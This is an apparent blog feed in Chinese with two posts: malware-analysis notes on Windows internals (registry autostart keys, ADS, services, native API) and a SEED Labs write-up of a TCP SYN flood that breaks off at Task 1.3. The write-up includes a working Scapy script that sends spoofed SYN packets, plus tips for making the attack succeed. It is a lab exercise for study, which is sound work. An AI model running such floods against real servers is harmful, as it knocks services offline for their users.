通过名字空间访问的文件</h3><ul><li>名字空间可以认为是固定数目的文件夹，每一个文件夹保存不同类型的对象；</li><li>底层的名字空间是NT名字空间，以前缀。NT名字空间可以访问所有设备，以及所有在NT名字空间中存在的其他名字空间；</li><li>以前缀<code>\\.\</code>开始的Win32设备名字空间，常被恶意代码用来直接访问物理设备，并像文件一样进行读写操作。例：以<code>\\.\PhysicalDisk1</code>来直接访问PhysicalDisk1，忽略它的文件系统，允许程序通过普通API不可能做到的方式来修改磁盘，可以读写数据到未分配的扇区，而无需创建或访问文件，避开防护软件的监控与检测。</li></ul><h3 id="备用数据流ads">1.4.3 备用数据流（ADS）</h3><ul><li>允许附加数据被添加到一个已经存在的NTFS文件中，相当于添加一个文件到另外一个文件中；</li><li>额外数据在列一个目录时不会被显示出来，并且在显示文件内容时也不显示；</li><li>只有在访问流时，才是可见的；</li><li>根据约定<code>normalFile.txt:$DATA</code>来命名，允许一个程序去读写一个流。</li></ul><h1 id="windows注册表">2. Windows注册表</h1><ul><li>Windows注册表被用来保存操作系统与程序的配置信息，如设置和选项。</li><li>和文件系统一样，也是基于主机的感染迹象的很好来源，能够揭示关于恶意代码功能的有用信息。</li><li>恶意代码使用注册表来完成持久驻留或者存储配置数据。持久驻留---自动运行（自启动）。</li></ul><h2 id="注册表结构">2.1 注册表结构</h2><ul><li>根键：一共有 5 个顶层根键节点，每一个根键有一个特定的目的。</li><li>子键：一个子键就像一个文件夹中的子文件夹。</li><li>键：一个键是一个注册表中的文件夹，包含额外的文件夹或键值。</li><li>值项：一个配对的名字和值。</li><li>值或数据：存储在注册表项中的数据。</li></ul><h2 id="注册表根键">2.2 注册表根键</h2><table><thead><tr class="header"><th><strong>注册表根键</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr class="odd"><td><strong>HKEY_LOCAL_MACHINE(HKLM)</strong></td><td><strong>保存对本地机器全局设置；</strong></td></tr><tr class="even"><td><strong>HKEY_CURRENT_USER(HKCU)</strong></td><td><strong>保存当前用户特定的设置；</strong></td></tr><tr class="odd"><td><strong>HKEY_CLASSES_ROOT</strong></td><td><strong>保存定义的类型信息；</strong></td></tr><tr class="even"><td><strong>HKEY_CURRENT_CONFIG</strong></td><td><strong>保存关于当前硬件配置的设置，特别是与当前和标准配置直接不同的部分；</strong></td></tr><tr class="odd"><td><strong>HKEY_USERS</strong></td><td><strong>定义默认用户、新用户和当前用户的配置；</strong></td></tr></tbody></table><h2 id="regegit">2.3 Regegit</h2><ul><li>注册表编辑器：Windows内建的用来查看和编辑注册表的工具。</li></ul><h2 id="自启动程序">2.4 自启动程序</h2><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br>HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run<br>HKEY_CURRENT_USER\Software\Microsoft\WindowsNT\CurrentVersion\Windows<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon<br></code></pre></td></tr></table></figure><h2 id="常用注册表函数">2.5 常用注册表函数</h2><ul><li>RegOpenKeyEx：打开一个注册表键进行编辑和查询</li><li>RegSetValueEx：添加一个新值，并设置数值</li><li>RegGetValue：返回注册表中一个键值</li></ul><h2 id="注册表脚本">2.3 注册表脚本</h2><ul><li>用.reg作为扩展的文件包含一个可读的注册表数据</li><li>双击运行后，会自动地通过合并文件包含的信息到注册表中</li><li>通过这种方法，可以达到修改或者操作注册表的功能</li><li>恶意代码有时会用此方法，但更多是通过编程方式</li></ul><h1 id="网络api">3. 网络API</h1><p>恶意代码通常依赖Windows API中很多的网络函数来进行通信</p><h2 id="伯克利兼容套接字">3.1 伯克利兼容套接字</h2><p>由Winsock库实现，主要在ws2_32.dll中。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311251523403.png"alt="image-20231125144237479" /><figcaption aria-hidden="true">image-20231125144237479</figcaption></figure><h2 id="网络的服务器和客户端">3.2 网络的服务器和客户端</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311251523404.png"alt="image-20231125144328290" /><figcaption aria-hidden="true">image-20231125144328290</figcaption></figure><h2 id="winnet-api">3.3 WinNet API</h2><ul><li>保存在Wininet.dll中;</li><li>比Windows API更高一级，实现了应用层协议，如HTTP和FTP;</li><li>可以用来连接远程服务器，并获取指令。</li><li>InternetOpen被用来初始化一个到互联网的连接。</li><li>InternetOpenUrl被用来访问一个URL(它可以是一个HTTP页面或一个FTP资源）。</li><li>InternetReadFile和ReadFile函数工作原理相似，允许程序从一个来自互联网的下载文件中读取数据。</li></ul><h1 id="跟踪恶意代码的运行">4. 跟踪恶意代码的运行</h1><h2 id="dll">4.1 DLL</h2><p><strong>定义：</strong></p><p>动态链接库是使用库在多个应用程序之间共享代码的Windows特有方式；一个DLL程序是不能独立运行的可执行文件，只能被EXE文件加载执行或导出函数。</p><p><strong>利用方式：</strong></p><ul><li>保存恶意代码（保存为DLL比EXE更有利，可以附加到其他进程）；</li><li>使用Windows DLL；</li><li>使用第三方DLL（借其他程序的DLL文件来完成恶意代码自己的功能）</li></ul><h2 id="进程">4.2 进程</h2><ul><li>恶意代码可以通过创建一个新进程，或修改一个已经存在的进程，来执行当前程序之外的代码。目前的恶意代码普遍<strong>将自身代码作为其他进程的一部分</strong>执行。</li><li>创建一个新的进程使用CreateProcess函数，让进程（恶意代码）共享系统内存。</li></ul><h2 id="线程">4.3 线程</h2><ul><li>线程是执行代码的容器，是Windows操作系统真正要执行的内容。</li><li>是被CPU执行的独立指令序列，不需要等待其他线程。</li><li>一个进程包含至少一个线程，所有线程共享同样的内存空间，但是每一个都有自己的处理器、寄存器和栈。</li><li>创建线程，使用CreateThread函数。</li></ul><p><strong>线程上下文：</strong></p><ul><li>当线程运行时，它对CPU绝对控制，不被其他线程影响。</li><li>当一个线程改变CPU中某个寄存器的值时，不会影响任何其他线程。</li><li>操作系统在切换之前，在CPU中的所有值会被保存到一个称为线程上下文的结构体中。然后操作系统加载这个线程上下文到一个新的线程中，并使这个新线程在CPU中执行。</li></ul><h2 id="使用互斥量的进程间协作">4.4 使用互斥量的进程间协作</h2><ul><li>全局对象，进程间或线程间协调；</li><li>用于控制共享资源的访问：同一时刻，只有一个线程拥有一个互斥量；</li><li>恶意代码常使用硬编码的方式来命名；</li><li>对WaitForSingleObject的调用，获取对互斥量的访问，任何后续线程试图获取对它的访问，都必须等待。当完成对互斥量使用后，需要使用ReleaseMutex函数进行释放。</li><li>互斥量通过CreateMutex函数创建，使用OpenMutex函数来获取互斥量的句柄。</li></ul><h2 id="服务">4.5 服务</h2><p>执行附加代码的另一种方式是将它作为服务安装</p><ul><li><p>Windows允许通过使用服务，来使任务作为后台应用程序运行，而不需要它们自己的进程或线程；</p></li><li><p>代码被Windows服务管理调度和运行，不需要用户输入；</p></li><li><p>服务通常作为<strong>SYSTEM或其他特权账户</strong>运行；</p><p>（需要一个管理员权限才能安装一个服务）</p></li><li><p>能够当操作系统启动时自动运行，在系统上持久化驻留；</p></li><li><p>在任务管理器中<strong>不作为一个进程显示</strong>出来。</p></li></ul><p><strong>通过Windows API 来安装和操作服务：</strong></p><ul><li>OpenSCManager：返回一个服务控制管理器<strong>句柄</strong>，用来进行后续与服务相关的函数调用。</li><li>CreateService：添加一个新服务到服务控制管理器，并且允许调用者制定服务是否在引导时自动启动，或者必须手动启动。</li><li>StartService：启动一个服务，并且仅在服务被设置成手动启动时使用。</li></ul><p><strong>服务类型：</strong></p><ul><li>WIN32_SHARE_PROCESS类型：以<strong>DLL</strong>形式，并且在一个共享的进程中组合多个不同的服务。</li><li>WIN32_OWN_PROCESS类型：以EXE形式，作为一个独立进程运行。</li><li>KERNEL_DRIVER：以SYS形式，被用来加载代码到内核中执行。</li></ul><h2 id="组件对象模型">4.6 组件对象模型</h2><p><strong>COM：</strong></p><ul><li>一个接口标准：使不同软件组件在不知道其他组件代码的接口规范时，相互之间可以进行调用。</li><li>分析使用COM的恶意代码：要能够判断哪段代码会被作为一个COM函数进行调用运行。</li><li>支持任何编程语言：被设计成一种可复用的软件组件，并可以被所有程序利用。</li></ul><p><strong>COM被实现成C/S框架：</strong></p><ul><li>客户端是使用COM对象的程序；</li><li>服务器是可复用的组件，就是COM对象本身。</li></ul><h2 id="异常">4.7 异常</h2><ul><li>异常机制允许一个程序在普通执行流程之外处理事件。异常一般是由错误引起的。当一个异常发生时，执行转移到处理这个异常的特殊例程中。</li><li>结构化异常处理（SEH）是Windows的异常处理机制。异常处理器是可嵌套的，层次结构。如果没有一个处理器响应异常，那么顶层的处理器将使应用程序崩溃。</li></ul><h1 id="内核模式和用户模式">5. 内核模式和用户模式</h1><p>通常，用户模式不能直接访问硬件，并且它被限制只能访问CPU上所有寄存器和可用指令的一个子集。为了在用户模式中操作硬件或改变内核中的状态，你必须依赖于WindowsAPI。</p><h1 id="原生api">6. 原生API</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311251523405.png"alt="image-20231125150911338" /><figcaption aria-hidden="true">image-20231125150911338</figcaption></figure><ul><li>原生API是用来和Windows进行交互的底层API，它们很少被非恶意程序使用，但是在恶意代码作者之间却很受欢迎。调用原生API函数可以绕过普通的WindowsAPI。</li><li>当调用WindowsAPI中的一个函数时,这个函数通常<strong>不会直接执行请求的动作</strong>，因为大多数重要数据结构都被保存在内核中，在内核外面的代码（用户模式代码)是无法访问它们的。微软为了使用户应用程序能够达到必需的功能，创建了一个多步骤的调用过程。上图说明了对于大多数API调用来说，这是如何工作的。</li><li>用户应用程序被给予对<strong>用户API</strong>(比如kernel32.dll和其他DLL)的访问，这些DLL会调用<strong>ntdll.dll</strong>，这是一个特殊的DLL程序，它管理用户空间与内核的交互。然后处理器切换到内核模式，并执行一个内核中的函数。</li><li>ntdll函数像内核中的函数一样，使用API和结构体。这些函数组成了<strong>原生API</strong>。</li></ul><p>参考教程：</p><ol type="1"><li><a href="https://www.cnblogs.com/john-h/p/5886870.html">C++注册表编程 - 程序员大叔 - 博客园 (cnblogs.com)</a></li><li><ahref="https://www.cnblogs.com/kzang/archive/2012/11/07/2758404.html">注册表操作(VC_Win32)- kzangv - 博客园 (cnblogs.com)</a></li><li><ahref="https://blog.csdn.net/u011555996/article/details/77945081">DLL程序入口DllMain详解-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP Attack</title>
    <link href="/2023/11/22/SEED-LABS/Network%20Security/TCP_IP%20Attack/"/>
    <url>/2023/11/22/SEED-LABS/Network%20Security/TCP_IP%20Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1. Overview</h1><p>本实验室的学习目标是让学生获得有关漏洞以及针对这些漏洞的攻击的第一手经验。智者从错误中学习。在安全教育中，我们研究导致软件漏洞的错误。研究过去的错误不仅能帮助学生理解为什么系统容易受到攻击，为什么一个看似微不足道的错误会变成一场灾难，为什么需要许多安全机制。更重要的是，它还能帮助学生了解漏洞的常见模式，从而避免今后再犯类似的错误。此外，以漏洞为案例，学生可以学习安全设计、安全编程和安全测试的原则。</p><p>TCP/IP协议中的漏洞代表了协议设计和实现中的一种特殊类型的漏洞；这些漏洞提供了宝贵的一课，让我们了解为什么要从一开始就设计安全措施，而不是事后才添加。此外，研究这些漏洞有助于学生理解网络安全的挑战以及为什么需要采取许多网络安全措施。在本实验室中，学生将对 TCP 进行多次攻击。本实验涵盖以下主题：</p><ul><li>TCP协议</li><li>TCP SYN洪水攻击和SYN cookie</li><li>TCP重置攻击</li><li>TCP会话劫持攻击</li><li>反向shell</li></ul><h1 id="lab-environment">2. Lab Environment</h1><p>在本实验室中，我们至少需要三台机器。我们使用容器来搭建实验环境。图 1描述了实验室设置。我们将使用攻击者容器发起攻击，同时使用其他三个容器作为受害者和用户机器。我们假设所有这些机器都在同一个局域网中。学生也可以使用三台虚拟机来完成这个实验，但使用容器会更方便。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500436.png"alt="image-20231228142943179" /><figcaption aria-hidden="true">image-20231228142943179</figcaption></figure><h2 id="container-setup-and-commands">2.1 Container Setup andCommands</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ docker-compose build <span class="hljs-comment"># Build the container image</span><br>$ docker-compose up <span class="hljs-comment"># Start the container</span><br>$ docker-compose down <span class="hljs-comment"># Shut down the container</span><br>// Aliases <span class="hljs-keyword">for</span> the Compose commands above<br>$ dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span><br>$ dcup <span class="hljs-comment"># Alias for: docker-compose up</span><br>$ dcdown <span class="hljs-comment"># Alias for: docker-compose down</span><br><br>$ dockps // Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span><br>$ docksh &lt;<span class="hljs-built_in">id</span>&gt; // Alias <span class="hljs-keyword">for</span>: docker <span class="hljs-built_in">exec</span> -it &lt;<span class="hljs-built_in">id</span>&gt; /bin/bash<br></code></pre></td></tr></table></figure><h2 id="about-the-attacker-container">2.2 About the AttackerContainer</h2><p>在本实验室中，我们可以使用<strong>虚拟机或攻击者容器</strong>作为攻击者机器。如果查看Docker Compose文件，你会发现攻击者容器的配置与其他容器不同。以下是不同之处：</p><ul><li><p>共享文件夹。当我们使用攻击者容器发动攻击时，需要将攻击代码放在攻击者容器内。在虚拟机中编辑代码比在容器中更方便，因为我们可以使用自己喜欢的编辑器。为了让虚拟机和容器共享文件，我们使用Docker 卷在虚拟机和容器之间创建了一个共享文件夹。如果查看 Docker Compose文件，你会发现我们在某些容器中添加了以下条目。它表示将主机（即虚拟机）上的./volumes 文件夹挂载到容器内的 /volumes 文件夹。我们将在 ./volumes文件夹（虚拟机上）中编写代码，以便在容器内使用它们。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500438.png"alt="image-20231213162539849" /><figcaption aria-hidden="true">image-20231213162539849</figcaption></figure></li><li><p>主机模式。在本实验室中，攻击者需要能够嗅探数据包，但在容器内运行嗅探程序会有问题，因为容器实际上是连接到虚拟交换机上的，所以它只能看到自己的流量，而永远看不到其他容器中的数据包。为了解决这个问题，我们为攻击者容器使用主机模式。这样，攻击者容器就能看到所有流量。当容器处于主机模式时，它可以看到主机的所有网络接口，甚至拥有与主机相同的IP地址。不过，容器仍是一台独立的机器，因为它的其他命名空间仍与主机不同。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500439.png"alt="image-20231228143145010" /><figcaption aria-hidden="true">image-20231228143145010</figcaption></figure></li></ul><h2 id="the-seed-account">2.3 The seed Account</h2><p>在本实验室中，我们需要从一个容器 telnet到另一个容器。我们已经在所有容器中创建了一个名为 seed 的账户。它的密码是dees。你可以远程登录这个账户。</p><h1 id="task-1-syn-flooding-attack">3. Task 1: SYN Flooding Attack</h1><p>SYN flood 是一种 DoS 攻击形式，攻击者向受害者的 TCP 端口发送许多 SYN请求，但无意完成 3 路握手过程。攻击者要么使用欺骗的 IP地址，要么不继续该过程。通过这种攻击，攻击者可以使受害者用于半开连接的队列泛滥，即已完成SYN、SYN-ACK 但尚未收到最终 ACK的连接。当队列满时，受害者就不能再接受任何连接。图 2展示了这种攻击。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500440.png"alt="image-20231228143305079" /><figcaption aria-hidden="true">image-20231228143305079</figcaption></figure><p>队列的大小有一个全系统范围的设置。在 Ubuntu操作系统中，我们可以使用以下命令查看设置。操作系统会根据系统内存大小来设置该值：内存越大，该值就越大。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sysctl net.ipv4.tcp_max_syn_backlog</span><br>net.ipv4.tcp_max_syn_backlog = 128<br></code></pre></td></tr></table></figure><p>我们可以使用<code>netstat -nat</code>命令来检查队列的使用情况，即与监听端口相关的半开连接的数量。此类连接的状态是<code>SYN-RECV</code>。如果三方握手结束，则连接状态为<code>ESTABLISHED</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124924.png"alt="image-20231122103814619" /><figcaption aria-hidden="true">image-20231122103814619</figcaption></figure><p><strong>SYN Cookie 应对措施</strong>：默认情况下，Ubuntu 的 SYN泛洪应对措施是开启的。这种机制被称为 SYN Cookie。如果机器检测到受到 SYN泛洪攻击，它就会启动。在受害者服务器容器中，我们已经关闭了 SYNCookie。我们可以使用下面的 sysctl命令来打开或关闭它：为0关闭，为1打开。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sysctl -a | grep syncookies (Display the SYN cookie flag)</span><br><span class="hljs-comment"># sysctl -w net.ipv4.tcp_syncookies=0 (turn off SYN cookie)</span><br><span class="hljs-comment"># sysctl -w net.ipv4.tcp_syncookies=1 (turn on SYN cookie)</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124925.png"alt="image-20231122103935591" /><figcaption aria-hidden="true">image-20231122103935591</figcaption></figure><p>要使用 sysctl 更改容器内的系统变量，容器需要配置 "privileged:true"条目（我们的受害者容器已配置）。如果没有这一设置，我们运行上述命令时将看到以下错误信息。容器没有权限进行更改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sysctl -w net.ipv4.tcp_syncookies=1</span><br>sysctl: setting key <span class="hljs-string">&quot;net.ipv4.tcp_syncookies&quot;</span>: Read-only file system<br></code></pre></td></tr></table></figure><h2 id="task-1.1-launching-the-attack-using-python">3.1 Task 1.1:Launching the Attack Using Python</h2><p>我们提供了一个名为 synflood.py 的 Python程序，但故意省略了代码中的一些重要数据。这段代码会发送伪造的 TCP SYN数据包，其中包含随机生成的源 IP地址、源端口和序列号。学生应完成代码，然后使用它对目标计算机发起攻击。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500441.png"alt="image-20231228143635084" /><figcaption aria-hidden="true">image-20231228143635084</figcaption></figure><p>让攻击运行至少一分钟，然后尝试 telnet进入受害者机器，看看能否成功。攻击很可能会失败。有多个问题可能导致攻击失败，下面列出了这些问题及解决方法：</p><ul><li><p>TCP 缓存问题：内核缓解机制。在 Ubuntu 20.04 上，如果 X机器从未与受害机器建立过 TCP 连接，当 SYN 泛洪攻击发起时，X 机器将无法telnet 到受害机器。但是，如果在攻击之前，X 机器已经与受害机器建立了telnet（或 TCP 连接），那么 X 似乎对 SYN 泛洪攻击"免疫"，可以在攻击期间成功 telnet到受害机器。受害机器似乎会记住过去的成功连接，并在今后与 "返回"客户端建立连接时使用这些记忆。这种行为在 Ubuntu 16.04及更早版本中并不存在。这是由于内核的缓解措施造成的：如果禁用 SYNCookie，TCP 会为 "经过验证的目的地 "保留四分之一的积压队列。从 10.9.0.6向服务器 10.9.0.5 发送 TCP 连接后，我们可以看到服务器记住（缓存）了10.9.0.6 的 IP地址，因此当连接来自它们时，它们将使用保留的空位，从而不会受到 SYN泛洪攻击的影响。要消除这种缓解方法的影响，我们可以在服务器上运行<code>ip tcp_metrics flush</code>命令。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500442.png"alt="image-20231228143803604" /><figcaption aria-hidden="true">image-20231228143803604</figcaption></figure></li><li><p>VirtualBox问题：如果您从一个虚拟机对另一个虚拟机进行攻击，而不是使用我们的容器设置，请参阅实验指导中的注释B。如果使用容器设置进行攻击，则不存在此问题。</p></li><li><p>TCP 重传问题：发送 SYN+ACK 数据包后，受害机器将等待 ACK数据包。如果没有及时收到 ACK 包，TCP 就会重传 SYN+ACK包。重传多少次取决于以下内核参数（默认值为 5）。经过这 5 次重传后，TCP将从半开放连接队列中删除相应的项目。每删除一个项目，就会有一个空位。您的攻击数据包和合法的telnet 连接请求数据包将争夺这个空位。我们的 Python程序可能不够快，因此会输给合法的 telnet数据包。为了在竞争中获胜，我们可以并行运行多个攻击程序实例。请尝试这种方法，看看能否提高成功率。应该运行多少个实例才能达到合理的成功率？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sysctl net.ipv4.tcp_synack_retries</span><br>net.ipv4.tcp_synack_retries = 5<br></code></pre></td></tr></table></figure></li><li><p>队列的大小：队列中可以存储多少个半开连接会影响攻击的成功率，可以使用以下命令调整队列的大小（上）。攻击正在进行时，您可以在受害容器上运行以下命令之一（下），查看队列中有多少项目。需要注意的是，队列中四分之一的空间是为"已证实的目的地 "保留的，因此如果我们将大小设置为 80，其实际容量约为60。请缩小受害者服务器上半开连接队列的大小，看看能否提高成功率。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sysctl -w net.ipv4.tcp_max_syn_backlog=80</span><br><br>$ netstat -tna | grep SYN_RECV | <span class="hljs-built_in">wc</span> -l<br>$ ss -n state syn-recv sport = :23 | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure></li></ul><p><strong>实验流程：</strong></p><ol type="1"><li><p>使用<code>netstat -nat</code>命令显示所有受害者系统上的TCP连接信息，包括本地地址和端口、远程地址和端口，以及连接的状态。可以看到开启了23号端口，Telnet使用的默认端口也是23。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124926.png"alt="image-20231122104746153" /><figcaption aria-hidden="true">image-20231122104746153</figcaption></figure></li><li><p>编写代码：使用Python中的Scapy库来创建和发送TCP SYN数据包，模拟SYNFlood攻击。目的IP为受害者容器IP，目的端口为受害者容器开放的23号端口。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/env python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> IP, TCP, send<br><span class="hljs-keyword">from</span> ipaddress <span class="hljs-keyword">import</span> IPv4Address<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> getrandbits<br><br>ip = IP(dst=<span class="hljs-string">&quot;10.9.0.5&quot;</span>)<br>tcp = TCP(dport=<span class="hljs-number">23</span>, flags=<span class="hljs-string">&#x27;S&#x27;</span>)<br>pkt = ip/tcp<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>pkt[IP].src = <span class="hljs-built_in">str</span>(IPv4Address(getrandbits(<span class="hljs-number">32</span>))) <span class="hljs-comment"># source iP</span><br>pkt[TCP].sport = getrandbits(<span class="hljs-number">16</span>) <span class="hljs-comment"># source port</span><br>pkt[TCP].seq = getrandbits(<span class="hljs-number">32</span>) <span class="hljs-comment"># sequence number</span><br>send(pkt, verbose = <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure></li><li><p>root权限运行攻击代码，一分钟后查看受害者机器TCP连接情况，发现已有96条状态为SYN_RECV的TCP连接（SYN_RECV状态表示服务器已经收到客户端发来的连接请求，并回复了确认，正在等待客户端的最终确认，以完成连接的建立），此数量刚好为128的四分之三。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124927.png"alt="image-20231122104910365" /><figcaption aria-hidden="true">image-20231122104910365</figcaption></figure></li><li><p>使用HostB容器，向受害者机器发起telnet连接请求，第一次尝试时就成功连接到受害者机器。首次登录能否成功取决于向受害者机器发送连接请求时是否正好有洪泛建立的会话被取消。如果有则可能成功登录，没有则会因为超时无法成功登录。因为我们登录后就进行了登出，所以显示TIME_WAIT状态（TIME_WAIT是 TCP协议中的一种状态，表示一个连接已经关闭，但在一定的时间内仍然保持在系统中。在这个状态下，系统等待一段时间，以确保远程端收到连接关闭的消息，同时允许任何延迟的数据包在网络上被丢弃。）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124928.png"alt="image-20231122105004778" /><figcaption aria-hidden="true">image-20231122105004778</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124929.png"alt="image-20231122105018135" /><figcaption aria-hidden="true">image-20231122105018135</figcaption></figure></li><li><p>退出登录后再次使用telnet进行连接，一次就成功登录。原因分析：如果禁用SYN Cookie，TCP 会为 "经过验证的目的地 "保留四分之一的积压队列。从10.9.0.6 向服务器 10.9.0.5 发送 TCP 连接后，服务器记住（缓存）了10.9.0.6 的 IP地址，因此当连接来自它们时，它们将使用保留的空位，从而不会受到 SYN泛洪攻击的影响。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124930.png"alt="image-20231122105045946" /><figcaption aria-hidden="true">image-20231122105045946</figcaption></figure></li><li><p>进行改进，提高攻击成功率。改进一：减小半连接队列大小；改进二：提高重传次数；改进三：同时运行两个攻击代码实例。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124931.png"alt="image-20231122105122988" /><figcaption aria-hidden="true">image-20231122105122988</figcaption></figure></li><li><p>清空TCP缓存，再次发起攻击。一段时间后，可以看到已有31条状态为SYN_RECV的TCP连接。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124932.png"alt="image-20231122105149178" /><figcaption aria-hidden="true">image-20231122105149178</figcaption></figure></li><li><p>尝试连接受害者机器，十余次尝试后，仍未能成功连接，攻击成功率上升。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124933.png"alt="image-20231122105210363" /><figcaption aria-hidden="true">image-20231122105210363</figcaption></figure></li></ol><h2 id="task-1.2-launch-the-attack-using-c">3.2 Task 1.2: Launch theAttack Using C</h2><p>除了 TCP 缓存问题外，如果我们能以足够快的速度发送欺骗 SYN数据包，任务 1.1中提到的所有问题都能迎刃而解。我们在实验设置中提供了一个名为 synflood.c的 C 程序。请在虚拟机上编译该程序，然后在目标计算机上发起攻击。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281500443.png"alt="image-20231228144418432" /><figcaption aria-hidden="true">image-20231228144418432</figcaption></figure><p>在发起攻击之前，请将队列大小恢复到初始值。请将结果与使用 Python程序得到的结果进行比较，并解释两者不同的原因。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>发动攻击，一分钟后，受害者机器半连接队列已有97个连接，约为128的四分之三。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124934.png"alt="image-20231122105256199" /><figcaption aria-hidden="true">image-20231122105256199</figcaption></figure></li><li><p>使用user1容器，尝试telnet连接受害者机器，多次尝试仍不能成功连接受害者机器。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221124935.png"alt="image-20231122105327108" /><figcaption aria-hidden="true">image-20231122105327108</figcaption></figure></li><li><p>C语言实现的TCP SYN flood攻击成功率更高的原因：</p><ul><li><strong>性能优化</strong>：C语言是一种编译型语言，它直接被编译成机器码，通常执行速度较快。Python则是解释型语言，它在运行时由解释器解释执行，这可能导致一些性能损失。在网络攻击中，攻击者可能更倾向于使用C语言，以获得更高的执行效率。</li><li><strong>底层控制</strong>：C语言提供对底层系统资源的更直接控制，包括内存管理和底层网络套接字操作。这种直接的控制使得攻击者能够更灵活地调整攻击参数以及处理大量的并发连接，从而提高攻击的成功率。</li><li><strong>系统调用</strong>：C语言允许直接调用系统级别的API，这可能允许攻击者更细粒度地控制网络栈和底层操作。在一些情况下，C语言的直接系统调用可能比Python的高级网络库提供的抽象更为灵活。</li></ul></li></ol><h2 id="task-1.3-enable-the-syn-cookie-countermeasure">3.3 Task 1.3:Enable the SYN Cookie Countermeasure</h2><p>请启用 SYN cookie 机制，并再次运行攻击，比较结果。</p><p><strong>实验流程：</strong></p><ol 